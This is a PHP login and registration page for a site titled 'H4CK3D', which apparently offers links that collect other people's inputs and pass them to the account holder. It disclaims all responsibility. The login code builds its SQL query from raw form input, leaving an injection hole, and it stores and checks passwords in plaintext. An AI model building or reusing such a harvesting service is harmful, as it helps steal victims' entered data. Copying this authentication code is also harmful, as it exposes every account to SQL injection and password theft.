<?php 
	include 'config.php';
$error_array = array();  
if(isset($_POST['login_button'])){
  $username = $_POST['log_username'];
  $password = $_POST['log_password'];
  $_SESSION['username'] = $username;

  $check_query = mysqli_query($con,"SELECT * FROM user WHERE username='$username' AND password='$password'");
  
  if(mysqli_num_rows($check_query) == 1){
    $row = mysqli_fetch_array($check_query);
    $password_db = mysqli_real_escape_string($con,$row['password']);
    $username_db = mysqli_real_escape_string($con,$row['username']);
      header("Location:login.php");
      exit();

    
  }else{
      array_push($error_array, "Wrong Password OR USERNAME, If you have forgotten the password OR username, please create a new account<br>");
    }

}

if(isset($_POST['reg_button'])){
  $username =mysqli_real_escape_string($con, $_POST['reg_username']);
  $name = mysqli_real_escape_string($con,$_POST['reg_name']);
  $password = mysqli_real_escape_string($con,$_POST['reg_password']);
  
  $check_query = mysqli_query($con, "SELECT * FROM user WHERE username='$username'");
  if(mysqli_num_rows($check_query) == 1){
    array_push($error_array, "THIS USERNAME ALREADY EXISTS PLEASE TRY ONE MORE USER NAME");
  }
  else{
    $query = mysqli_query($con, "INSERT INTO `user` (`id`, `name`, `username`, `password`, `hacked_no`) VALUES (NULL, '$name', '$username', '$password', '')");
    array_push($error_array, "NOW YOU CAN LOGIN AS YOUR USERNAME AND TYPING YOUR PASSWORD");
  }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
<style>
@font-face {
  font-family: HACKED;
  src: url(HACKED.ttf);
}
*{
  font-family: HACKED;
}
body{
  background-color: black;
  color:green;
}
.login-register{
}
form{
  color:green;
}
input[type="text"]{
    border: none;
    border-radius: 5px;
    width: 250px;
    box-shadow: 0 0 20px 2px white;text-align: center;
}
input[type="text"]:hover{
    border: none;
    border-radius: 5px;
    width: 250px;
    box-shadow: 0 0 20px 2px #47ffff;
    text-align: center;
}
input[type="password"]{
    border: none;
    border-radius: 5px;
    width: 250px;
    box-shadow: 0 0 20px 2px white;text-align: center;
}
input[type="password"]:hover{
    border: none;
    border-radius: 5px;
    width: 250px;
    box-shadow: 0 0 20px 2px #47ffff;text-align: center;
}
input[type="submit"]{
    border: none;
    border-radius: 5px;
    width: 250px;
    box-shadow: 0 0 20px 2px green;text-align: center;
}
</style>

<title>H4CK3D</title>
</head>
<body>
  <h2 style=" font-family: 'HACKED'; font-size: 100px; text-align: center;">H4CK4D</h2>
<div >

<h1 style="font-family: 'HACKED';font-size: 30px;text-align: center;">THIS WEBSITE HAS BEEN MADE BY KHAIR RUENSO(KHAIR BAKSH)</h1>

<div class="login-register d-flex justify-content-center col-md-12">
<form action='index.php' method="POST">
        <input type="text" name="log_username" placeholder="USERNAME" required>
        <br><br>
        <input type="password" name="log_password" placeholder="Password">
        <br><br>
        <?php if(in_array("Wrong Password OR USERNAME, If you have forgotten the password OR username, please create a new account<br>", $error_array)) echo "Wrong Password OR USERNAME, If you have forgotten the password OR username, please create a new account<br>"; ?>
        
        <input type="submit" name="login_button" value="LOGIN">
        <br>
        
       
      </form>
      
</div>
<br>
<div class="login-register d-flex justify-content-center col-md-12">
<form action='index.php' method="POST">
        <input type="text" name="reg_name" placeholder="NAME" value="" required>
        <br><br>
        <input type="text" name="reg_username" placeholder="USERNAME">
        <br><br>
        <input type="password" name="reg_password" placeholder="Password">
        <br><br>
        <?php if(in_array("THIS USERNAME ALREADY EXISTS PLEASE TRY ONE MORE USER NAME", $error_array)) echo "THIS USERNAME ALREADY EXISTS PLEASE TRY ONE MORE USER NAME"; ?><br>
        <input type="submit" name="reg_button" value="REGISTER">
        <br>
        <?php if(in_array("NOW YOU CAN LOGIN AS YOUR USERNAME AND TYPING YOUR PASSWORD", $error_array)) echo "NOW YOU CAN LOGIN AS YOUR USERNAME AND TYPING YOUR PASSWORD"; ?>
       
      </form>
</div>
      </div>
      <br>
<h2 style="font-family: 'HACKED';font-size: 20px;text-align: center;">DISCLAIMER:</h2>
<h3 style="font-family: 'HACKED';font-size: 20px;text-align: center;">ANY ACTIVATY OR ACT DONE IN THIS WEBSITE IS ALL ON THE USER, NOT ON THE DEVELOPER.</h3>
<p style="font-family: 'HACKED';text-align: center;">HOW DOES IT WORK?</p>
<p style="font-family: 'HACKED';text-align: center;">IT WILL COLLECT THE USER INPUTS FROM YOUR LINK THEN GIVES TO YOU.</p>
</body>
</html>
